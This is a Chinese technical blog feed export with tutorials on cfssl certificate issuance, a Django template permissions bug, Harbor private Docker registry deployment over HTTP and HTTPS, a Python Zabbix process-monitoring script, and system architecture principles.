<p><strong>修改ca-csr.config</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">    &#123;</div><div class="line">    &quot;CN&quot;: &quot;Self Signed Ca&quot;,</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;rsa&quot;,</div><div class="line">        &quot;size&quot;: 2048</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;O&quot;: &quot;Netease&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;,            </div><div class="line">            &quot;OU&quot;: &quot;OT&quot;</div><div class="line">        &#125;    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>生成CA证书和私钥</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cfssl gencert -initca ca-csr.json | cfssljson -bare ca -</div><div class="line">生成ca.pem、ca.csr、ca-key.pem(CA私钥,需妥善保管)</div></pre></td></tr></table></figure></p>
<h5 id="签发Server-Certificate"><a href="#签发Server-Certificate" class="headerlink" title="签发Server Certificate"></a>签发Server Certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; server.json</div><div class="line">vim server.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;Server&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;192.168.1.1&quot;</div><div class="line">       ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">生成服务端证书和私钥</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=server server.json | cfssljson -bare server</div></pre></td></tr></table></figure>
<h5 id="签发Client-Certificate"><a href="#签发Client-Certificate" class="headerlink" title="签发Client Certificate"></a>签发Client Certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; client.json</div><div class="line">vim client.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;Client&quot;,</div><div class="line">    &quot;hosts&quot;: [],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">生成客户端证书和私钥</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=client client.json | cfssljson -bare client</div></pre></td></tr></table></figure>
<h5 id="签发peer-certificate"><a href="#签发peer-certificate" class="headerlink" title="签发peer certificate"></a>签发peer certificate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">cfssl print-defaults csr &amp;gt; member1.json</div><div class="line">vim member1.json</div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;member1&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;192.168.1.1&quot;</div><div class="line">    ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;SH&quot;,</div><div class="line">            &quot;ST&quot;: &quot;SH&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">为节点member1生成证书和私钥:</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=peer member1.json | cfssljson -bare member1</div><div class="line">针对etcd服务,每个etcd节点上按照上述方法生成相应的证书和私钥</div></pre></td></tr></table></figure>
<h5 id="最后校验证书"><a href="#最后校验证书" class="headerlink" title="最后校验证书"></a>最后校验证书</h5><p>校验生成的证书是否和配置相符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">openssl x509 -in ca.pem -text -noout</div><div class="line">openssl x509 -in server.pem -text -noout</div><div class="line">openssl x509 -in client.pem -text -noout</div></pre></td></tr></table></figure></p>
<h4 id="k8s集群所需证书"><a href="#k8s集群所需证书" class="headerlink" title="k8s集群所需证书"></a>k8s集群所需证书</h4><p><img src="http://www.simlinux.com/wp-content/uploads/2017/09/cert.jpg" alt=""></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="https://coreos.com/os/docs/latest/generate-self-signed-certificates.html" target="_blank" rel="external">https://coreos.com/os/docs/latest/generate-self-signed-certificates.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Django模板无法使用perms变量问题]]></title>
      <url>/2017/09/06/django-e6-a8-a1-e6-9d-bf-e6-97-a0-e6-b3-95-e4-bd-bf-e7-94-a8perms-e5-8f-98-e9-87-8f-e9-97-ae-e9-a2-98.html</url>
      <content type="html"><![CDATA[<p>首先,在使用Django内置权限管理系统时,settings.py文件要添加</p>
<pre><code>INSTALLED_APPS添加:
&apos;django.contrib.auth&apos;,

MIDDLEWARE添加:
&apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;,

&apos;django.contrib.auth.context_processors.auth&apos;,
TEMPLATES = [
    {
        &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;,
        &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)],
        &apos;APP_DIRS&apos;: True,
        &apos;OPTIONS&apos;: {
            &apos;context_processors&apos;: [
                &apos;django.template.context_processors.debug&apos;,
                &apos;django.template.context_processors.i18n&apos;,
                &apos;django.template.context_processors.media&apos;,
                &apos;django.template.context_processors.static&apos;,
                &apos;django.template.context_processors.tz&apos;,
                &apos;django.contrib.messages.context_processors.messages&apos;,
                &apos;django.template.context_processors.request&apos;,
                &apos;django.contrib.auth.context_processors.auth&apos;,
            ],
        },
    },
]
`&lt;/pre&gt;

如何在模板进行权限检查呢？
根据官网说明 https://docs.djangoproject.com/en/1.11/topics/auth/default/#permissions ,已登录用户权限保存在模板{{ perms }}变量中,是权限模板代理django.contrib.auth.context_processors.PermWrapper的一个实例，
具体可以查看django/contrib/auth/context_processors.py源码

测试用例:

![](http://www.simlinux.com/wp-content/uploads/2017/09/codeexample.jpg)

测试过程中,发现{{ perms }}变量压根不存在,没有任何输出;好吧,只能取Debug Django的源码了

&lt;pre&gt;`def auth(request):
    &quot;&quot;&quot;
    Returns context variables required by apps that use Django&apos;s authentication
    system.

    If there is no &apos;user&apos; attribute in the request, uses AnonymousUser (from
    django.contrib.auth).
    &quot;&quot;&quot;
    if hasattr(request, &apos;user&apos;):
        user = request.user
    else:
        from django.contrib.auth.models import AnonymousUser
        user = AnonymousUser()
    print(user, PermWrapper(user), &apos;-----------------------&apos;)
    return {
        &apos;user&apos;: user,
        &apos;perms&apos;: PermWrapper(user),
    }

`&lt;/pre&gt;

测试访问接口,发现有的接口有打印权限信息,有的没有，似乎恍然醒悟

&lt;pre&gt;`可以打印权限信息的接口返回:
 return render(request, &apos;fms/fms_add.html&apos;, {&apos;request&apos;: request, &apos;form&apos;: form, &apos;error&apos;: error})
不能打印权限新的接口返回:
 return render_to_response( &apos;fms/fms.html&apos;, data)
`&lt;/pre&gt;

render和render_to_response区别
render是比render_to_reponse更便捷渲染模板的方法,会自动使用RequestContext,而后者需要手动添加:

&lt;pre&gt;`return render_to_response(request, &apos;fms/fms_add.html&apos;, {&apos;request&apos;: request, &apos;form&apos;: form, &apos;error&apos;: error},context_instance=RequestContext(request))
</code></pre><p>其中RequestContext是django.template.Context的子类.接受request和context_processors,从而将上下文填充渲染到模板<br>问题已经很明确，由于使用了render_to_response方法,没有手动添加context_instance=RequestContext(request)导致模板不能使用变量</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[企业级Docker私有仓库部署(https)]]></title>
      <url>/2017/08/05/e4-bc-81-e4-b8-9a-e7-ba-a7docker-e7-a7-81-e6-9c-89-e4-bb-93-e5-ba-93-e9-83-a8-e7-bd-b2https.html</url>
      <content type="html"><![CDATA[<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><ul>
<li>Centos7.3 x64</li>
<li>docker-ce-17.06.0</li>
<li>docker-compose-1.15.0</li>
<li>Python-2.7.5(系统默认)</li>
</ul>
<h4 id="部署目标"><a href="#部署目标" class="headerlink" title="部署目标"></a>部署目标</h4><ul>
<li>使用HTTPS协议</li>
<li>支持Clair(在Harbor1.2版本会支持)</li>
</ul>
<h5 id="支持HTTPS"><a href="#支持HTTPS" class="headerlink" title="支持HTTPS"></a>支持HTTPS</h5><p>生产环境最好由权威CA机构签发证书(免费的推荐StartSSL,可参考<a href="https://www.wosign.com/Support/Nginx.html),这里为了测试方便使用自签发的证书" target="_blank" rel="external">https://www.wosign.com/Support/Nginx.html),这里为了测试方便使用自签发的证书</a></p>
<ul>
<li><p>创建CA证书</p>
<pre><code>openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt
</code></pre><p> `</p>
</li>
<li><p>生成CSR公钥</p>
<pre>`  openssl req  -newkey rsa:4096 -nodes -sha256 -keyout hub.wow.key  -out hub.wow.csr
`</pre>
</li>
<li><p>颁发证书<br>*</p>
<pre>`  openssl x509 -req -days 365 -in hub.wow.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out hub.wow.crt

`</pre>
</li>
<li><p>部署证书</p>
<pre>`cp hub.wow.crt hub.wow.key   /data/harbor/keys/
vim /data/harbor/harbor.cfg
  hostname = hub.wow
  ui_url_protocol = https
  ssl_cert = /data/harbor/keys/hub.wow.crt
  ssl_cert_key = /data/harbor/keys/hub.wow.key

    cd /data/harbor
    ./prepare  重新生成配置文件
    docker-compose down
    docker-compose up
`</pre>
</li>
<li><p>通过HTTPS访问私有仓库</p>
<p><pre>`WebUI: <a href="https://how.wow" target="_blank" rel="external">https://how.wow</a><br>Docker Client:</pre></p>
<p>[root@hub ~]# docker login -u admin -p Harbor12345 hub.wow<br>Login Succeeded</p>
</li>
</ul>
<p><strong>问题</strong> ：<br>docker login时提示x509: certificate signed by unknown authority<br>解决方法: 自签名的证书不被系统信任,需要cp ca.crt /etc/docker/certs.d/hub.wow/,  无需重启docker</p>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[企业级Docker私有仓库之Harbor部署(http)]]></title>
      <url>/2017/08/04/e4-bc-81-e4-b8-9a-e7-ba-a7docker-e7-a7-81-e6-9c-89-e4-bb-93-e5-ba-93-e4-b9-8bharbor-e9-83-a8-e7-bd-b2http.html</url>
      <content type="html"><![CDATA[<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><ul>
<li>Centos7.3 x64</li>
<li>docker-ce-17.06.0</li>
<li>docker-compose-1.15.0</li>
<li>Python-2.7.5(系统默认)</li>
</ul>
<h4 id="Docker及Docker-compose安装"><a href="#Docker及Docker-compose安装" class="headerlink" title="Docker及Docker-compose安装"></a>Docker及Docker-compose安装</h4><pre><code> yum install -y yum-utils device-mapper-persistent-data lvm2
 yum-config-manager \
    --add-repo \
    https://download.docker.com/linux/centos/docker-ce.repo
 yum-config-manager --enable docker-ce-edge
 yum makecache fast
 systemctl start docker 
 systemctl enable docker

curl -L https://github.com/docker/compose/releases/download/1.15.0/docker-compose-`uname -s`-`uname -m` &amp;gt; /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
`&lt;/pre&gt;

#### Habor部署配置

&lt;pre&gt;`wget https://github.com/vmware/harbor/releases/download/v1.1.2/harbor-offline-installer-v1.1.2.tgz
tar xf harbor-offline-installer-v1.1.2.tgz
cd harbor/

vim harbor.cfg
hostname = hub.wow
其他默认(http协议)

./install.sh
安装成功后，可以通过http://hub.wow/访问
`&lt;/pre&gt;

![](http://www.simlinux.com/wp-content/uploads/2017/08/harborui.jpg)

#### Docker客户端使用

由于Harbor默认使用的http协议,故需要在Docker client上的Dockerd服务增加--insecure-registry hub.wow
Centos7修改方式为:

&lt;pre&gt;`vim /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd  --insecure-registry hub.wow

systemctl daemon-reload
systemctl reload docker
`&lt;/pre&gt;

&lt;pre&gt;`[root@localhost harbor]# docker login -u admin -p Harbor12345 hub.wow
官方仓库下载busybox镜像
[root@localhost harbor]# docker pull busybox 
[root@localhost harbor]# docker images
REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE
busybox                     latest              efe10ee6727f        2 weeks ago         1.13MB
本地基于busybox:latest创建标记hub.wow/busybox:latest
[root@localhost harbor]# docker tag busybox:latest hub.wow/project_name/busybox:latest
推送本地镜像busybox:latest 到hub.wow私有仓库
[root@localhost harbor]# docker push hub.wow/project_name/busybox:latest
</code></pre><h4 id="Harbor服务管理"><a href="#Harbor服务管理" class="headerlink" title="Harbor服务管理"></a>Harbor服务管理</h4><p>cd harbor/<br> docker-compose -f ./docker-compose.yml  [ up|down|ps|stop|start ]</p>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[企业级Docker私有仓库之Harbor]]></title>
      <url>/2017/08/04/e4-bc-81-e4-b8-9a-e7-ba-a7docker-e7-a7-81-e6-9c-89-e4-bb-93-e5-ba-93-e4-b9-8bharbor.html</url>
      <content type="html"><![CDATA[<h4 id="Harbor特性"><a href="#Harbor特性" class="headerlink" title="Harbor特性"></a><strong>Harbor特性</strong></h4><ul>
<li>基于角色的访问控制: 用户与Docker镜像仓库通过“项目”进行组织管理，一个用户可以对多个镜像仓库在同一命名空间（project）里有不同的权限</li>
<li>基于策略的镜像复制: 镜像可以在不同的Registry实例之间复制,尤其适合LB，HA，多数据中心，混合云和多云的场景</li>
<li>支持LDAP/AD</li>
<li>镜像可以被删除，空间可以被回收</li>
<li>Notary服务(Docker官方,详细参考<a href="https://github.com/docker/notary/blob/master/docs/service_architecture.md)：" target="_blank" rel="external">https://github.com/docker/notary/blob/master/docs/service_architecture.md)：</a> 确认镜像来源是否合法及内容完整性等</li>
<li>友好的Web管理界面</li>
<li>支持审计：所有的容器操作都会被跟踪记录</li>
<li>支持RESTful API</li>
<li>在Harbor1.2中支持Clair</li>
</ul>
<h4 id="Harbor主要组件"><a href="#Harbor主要组件" class="headerlink" title="Harbor主要组件"></a><strong>Harbor主要组件</strong></h4><p>Harbor系统由七个容器组成：Proxy(Nginx)、Jobservice、UI、Adminserver、Registry、Database(MySQL)、Log</p>
<ul>
<li>Proxy(Nginx): 提供反向代理、用户的不同请求由Proxy分发到后端UI、Registry等</li>
<li>Jobservice(harbor-jobservice): 负责处理不同Harbor实例间镜像的复制</li>
<li>UI(harbor-ui): 该容器包含了Harbor的UI、认证及API服务*   Adminserver(harbor-adminserver): 管理系统配置，并提供相应的WEB页面和api共用户操作</li>
<li>Registry： Docker官方的Registry镜像，主要提供镜像的存储和分发功能</li>
<li>Log(harbor-log): 负责搜集其他容器日志</li>
<li>Database(harbor-db): 提供数据持久化服务,使用的MySQL</li>
</ul>
<h4 id="Harbor通信架构"><a href="#Harbor通信架构" class="headerlink" title="Harbor通信架构"></a>Harbor通信架构</h4><p><img src="http://www.simlinux.com/wp-content/uploads/2017/08/harbor.jpg" alt=""></p>
<p>详细可以通过官网了解: <a href="https://github.com/vmware/harbor/wiki/Architecture-Overview-of-Harbor" target="_blank" rel="external">https://github.com/vmware/harbor/wiki/Architecture-Overview-of-Harbor</a></p>
<h4 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h4><ul>
<li>Docker1.10.0+</li>
<li>Docker-compose1.6.0+</li>
<li>Python2.7+</li>
</ul>
<h4 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h4><p>配置文件harbor.cfg中的参数有两类:<br>1. 必选参数(更新harbor.cfg,重新安装harbor后生效)<br>2. 可选参数(一般安装时默认设置,安装后通过WebUI配置，且优先级高，会忽略harbor.cfg中的配置),HarborV1.1.2新增AdminServer服务用于管理配置<br> <strong>注</strong>：在注册或者创建harbor用户前，必须正确设置auth&#95;mode;系统中除了默认的admin用户外，其他用户的auth_mode不能更改</p>
<h5 id="必选参数"><a href="#必选参数" class="headerlink" title="必选参数"></a>必选参数</h5><pre><code>hostname: 设置除localhost/127.0.0.1外的IP或者域名.用于访问WebUI和registry服务
ui_url_protocol： (http/https,默认http),用于访问WebUI和token/notification服务的协议，如果Notary启用，则需要设置成https
db_password： MySQL数据库密码
max_job_workers： 默认3，在job服务里面最大并发复制进程数(将镜像的所有tag同步到远端实例)
customize_crt： on or off,默认on,将会创建私钥和根证书用于生成和校验token
ssl_cert： 证书路径,开启https时生效
ssl_cert_key： 秘钥路径，开启https时生效
secretkey_path： 用于在复制过程过程中加解密远程实例密码的秘钥路径
`&lt;/pre&gt;

##### 可选参数

&lt;pre&gt;`邮箱设置：用于发送重置密码邮件给用户
email_server = smtp.mydomain.com
email_server_port = 25
email_identity =
email_username = sample_admin@mydomain.com
email_password = abc    
email_from = admin sample_admin@mydomain.com
email_ssl = false
harbor_admin_password: 第一次登录Harbor WebUI的初始管理员密码admin/Harbor12345
auth_mode: 用户登录认证方式，默认db_auth;也可通过ldap_auth(在升级harbor时要确保和旧的harbor认证方式一致)
ldap_url: LDAP URL，如ldaps://ldap.mydomain.com，当auth_mode设置成ldap_auth时生效
ldap_searchdn: LDAP搜索域如uid=admin,ou=people,dc=mydomain,dc=com
ldap_search_pwd: 指定ldap_searchdn密码
ldap_basedn: LDAP根域如ou=people,dc=mydomain,dc=com
ldap_filter: 搜索过滤如objectClass=person
ldap_uid: 通过指定属性匹配用户，如uid、cn、email和其他属性
ldap_scope: 搜索用户范围1-LDAP_SCOPE_BASE, 2-LDAP_SCOPE_ONELEVEL, 3-LDAP_SCOPE_SUBTREE,默认3
self_registration： on or off，关闭时，新用户只能通过该admin用户在Harbor后台添加；启用时，用户可以自己注册;当auth_mode是ldap_auth时，注册功能是关闭的
token_expiration： token service生成的token有效期,默认30分钟(单位:分)
project_creation_restriction： 创建项目限制；默认所有用户都可以创建项目,设置为adminonly时，只有admin用户可以创建
verify_remote_cert: on or off,默认on;Harbor和远端registry实例通信时是否校验SSL/TLS证书；通常远端实例自己签发或者不信任的证书时，设置off
</code></pre><h4 id="配置Harbor后端存储"><a href="#配置Harbor后端存储" class="headerlink" title="配置Harbor后端存储"></a>配置Harbor后端存储</h4><p>默认Harbor会将镜像存储在本地文件系统，也支持S3、Openstack Swift、Ceph等，可以通过修改common/templates/registry/config.yml文件进行配置,可参考 <a href="https://docs.docker.com/registry/configuration/" target="_blank" rel="external">https://docs.docker.com/registry/configuration/</a></p>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Zabbix LLD实现进程数监控]]></title>
      <url>/2017/04/19/e4-bd-bf-e7-94-a8zabbix-lld-e5-ae-9e-e7-8e-b0-e8-bf-9b-e7-a8-8b-e6-95-b0-e7-9b-91-e6-8e-a7.html</url>
      <content type="html"><![CDATA[<h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h3><ul>
<li>针对特定进程数量做监控报警</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><ol>
<li>通过Zabbix LLD自动发现：每台机器都跑了什么服务、每个服务应该跑多少进程</li>
<li>Zabbix Agent 30s将当前机器跑了哪些服务、每个服务进程数上报Zabbix Server</li>
<li>开发给定配置文件proccessInfo.txt:  IP 服务名称 进程数量,此配置作为监控依据</li>
<li>proccessInfo.txt配置文件需在每次变更配置时，自动生成最新</li>
</ol>
<h3 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a><strong>配置流程</strong></h3><ol>
<li>LLD自动发现脚本</li>
<li>数据采集脚本</li>
<li>Agent添加Key</li>
<li>Zabbix Server添加模板组</li>
<li>创建自动发现规则(监控项、报警触发器)</li>
<li>添加当前进程数监控项(通过Zabbix Trapper方式，由Agent端)</li>
<li>定义报警内容</li>
</ol>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a><strong>具体步骤</strong></h3><h4 id="LLD自动发现脚本"><a href="#LLD自动发现脚本" class="headerlink" title="LLD自动发现脚本"></a><strong>LLD自动发现脚本</strong></h4><pre><code>LLD自动发现,将进程名称及进程总数上报Zabbix Server：
/usr/bin/python services.py services_list

{
    &quot;data&quot;: [
        {
            &quot;{#SERVICENAME}&quot;: &quot;192.168.1.2-p_q1_server&quot;, 
            &quot;{#TRIGGER_VALUE}&quot;: 3
        }, 
        {
            &quot;{#SERVICENAME}&quot;: &quot;192.168.1.2-p_world_d2_server&quot;, 
            &quot;{#TRIGGER_VALUE}&quot;: 1
        }, 
        {
            &quot;{#SERVICENAME}&quot;: &quot;192.168.1.2-p_gate_server&quot;, 
            &quot;{#TRIGGER_VALUE}&quot;: 2
        }, 
        {
            &quot;{#SERVICENAME}&quot;: &quot;192.168.1.2-p_world_d1_server&quot;, 
            &quot;{#TRIGGER_VALUE}&quot;: 1
        }
    ]
}

数据采集上报： /usr/bin/python services.py {HOST.HOST}
`&lt;/pre&gt;

&lt;pre&gt;`# -*- coding: utf-8 -*-

import json
import commands
import subprocess
import re
import sys

class services_monitor:

        def __init__(self):

            self.zabbix_server_ip = &apos;192.168.1.1&apos;
            self.info_path = &apos;/home/proccessInfo.txt&apos;
            self.data_path = &apos;/tmp/.process_number_monitor.log&apos;

        def ip(self):
            ipstr = &apos;([0-9]{1,3}\.){3}[0-9]{1,3}&apos;
            ipconfig_process = subprocess.Popen(&quot;ifconfig&quot;, stdout=subprocess.PIPE)
            output = ipconfig_process.stdout.read()
            ip_pattern = re.compile(&apos;(inet addr:%s)&apos; % ipstr)
            pattern = re.compile(ipstr)
            iplist = []
            for ipaddr in re.finditer(ip_pattern, str(output)):
                ip = pattern.search(ipaddr.group())
                if ip.group() != &quot;127.0.0.1&quot;:
                    iplist.append(ip.group())
            ip = &apos;|&apos;.join(iplist)
            return ip

        def check_proc(self,proc_name):

            cmd = &apos;ps -ef |grep  %s|grep -v grep|wc -l&apos; % proc_name
            proccess_info = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)

            # list=proccess_info.stdout.read().strip().split(&apos;\n&apos;)
            procss_num = proccess_info.communicate()[0]
            return procss_num

        def get_info(self,ip):

            service = []
            status, result = commands.getstatusoutput(&quot;grep -E &apos;%s&apos; %s&quot; % (str(ip),self.info_path))
            result = result.split(&apos;\n&apos;)
            for i in result:
                i = list(i.split(&apos; &apos;))
                service.append({&quot;{#SERVICENAME}&quot;: i[0].strip() + &quot;-&quot; + i[1].strip(), &quot;{#TRIGGER_VALUE}&quot;:int(i[2].strip())})
            data = json.dumps({&apos;data&apos;: service}, sort_keys=True, indent=4)
            return data

        def collect_data(self,data):
            data = json.loads(data)[&quot;data&quot;]
            commands.getstatusoutput(&apos;cat /dev/null &amp;gt;%s&apos; % self.data_path)
            f = open(self.data_path,&apos;a&apos;)
            for i  in data:
                name = i[&apos;{#SERVICENAME}&apos;].split(&apos;-&apos;)
                ip = name[0]
                proc_name =  name[1]
                f.write(&apos;%s\tproc_num[%s]\t%s&apos; %(ip,i[&apos;{#SERVICENAME}&apos;],self.check_proc(proc_name)))
            f.close()

        def send_data(self,data_path):
            status,output = commands.getstatusoutput(&apos;/bin/bash -c &quot;zabbix_sender -z  %s  -i  %s &amp;amp;&amp;gt;/dev/null&quot;&apos; % (self.zabbix_server_ip,self.data_path))
            print status,output

if __name__ == &apos;__main__&apos;:

    services = services_monitor()
    ip = services.ip()
    data = services.get_info(ip)
    try:
        argv = sys.argv[1]
        if argv == &quot;services_list&quot;:
            print data
        else:
            services.collect_data(data)
            services.send_data(services.data_path)
    except IndexError:
        print data

`&lt;/pre&gt;

#### **Agent添加Key**

&lt;pre&gt;`vim /usr/local/etc/zabbix_agentd.conf
UserParameter=dzpt.service.process.discovery,/usr/bin/python /home/opt/scripts/services.py services_list
UserParameter=dzpt.service.process.exec[*],/usr/bin/python /home/opt/scripts/services.py  $1
</code></pre><h4 id="创建自动发现规则-监控项Trapper方式、报警触发器"><a href="#创建自动发现规则-监控项Trapper方式、报警触发器" class="headerlink" title="创建自动发现规则(监控项Trapper方式、报警触发器)"></a><strong>创建自动发现规则(监控项Trapper方式、报警触发器)</strong></h4><p><img src="http://www.simlinux.com/wp-content/uploads/2017/04/rules.jpg" alt=""></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2017/04/roles-items.jpg" alt=""></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2017/04/roles-triggers.jpg" alt=""></p>
<h4 id="添加当前进程数监控项"><a href="#添加当前进程数监控项" class="headerlink" title="添加当前进程数监控项"></a><strong>添加当前进程数监控项</strong></h4><p><img src="http://www.simlinux.com/wp-content/uploads/2017/04/process-stat.jpg" alt=""></p>
<h4 id="定义报警内容"><a href="#定义报警内容" class="headerlink" title="定义报警内容"></a><strong>定义报警内容</strong></h4><p>Action中定义(此处略)</p>
<h4 id="将定义好的模板链接到主机或者其他模板即可"><a href="#将定义好的模板链接到主机或者其他模板即可" class="headerlink" title="将定义好的模板链接到主机或者其他模板即可"></a><strong>将定义好的模板链接到主机或者其他模板即可</strong></h4><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a><strong>最后</strong></h3><p>使用Zabbix LLD之后，可以设定多久更新一次监控项及监控阀值；当配置文件变更时，无需人为调整阀值和监控项</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[架构学习之路-高可用高并发系统设计原则]]></title>
      <url>/2017/04/13/e6-9e-b6-e6-9e-84-e5-ad-a6-e4-b9-a0-e4-b9-8b-e8-b7-af-e9-ab-98-e5-8f-af-e7-94-a8-e9-ab-98-e5-b9-b6-e5-8f-91-e7-b3-bb-e7-bb-9f-e8-ae-be-e8-ae-a1-e5-8e-9f-e5-88-99.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>本系列博客主要是学习开涛《亿级流量网站架构核心技术》一书学习笔记及自己的感悟：</p>
</blockquote>
<h4 id="架构设计三大定律"><a href="#架构设计三大定律" class="headerlink" title="架构设计三大定律"></a>架构设计三大定律</h4><blockquote>
<p>墨菲定律</p>
<ul>
<li>任何事没有表面看起来那么简单</li>
<li>所有的事都会比预计的时间长</li>
<li>可能出错的事情总会出错</li>
<li><p>担心某种事情发生，那么它就更有可能发生</p>
<p>康威定律</p>
</li>
</ul>
</blockquote>
<ul>
<li>系统架构师公司组织架构的反映</li>
<li>按照业务闭环进行系统拆分/组织架构划分，实现闭环、高内聚、低耦合，减少沟通成本</li>
<li>如果沟通出现问题，应该考虑进行系统和组织架构的调整</li>
<li>适合时机进行系统拆分，不要一开始就吧系统、服务拆分拆的非常细，虽然闭环，但是每个人维护的系统多，维护成本高</li>
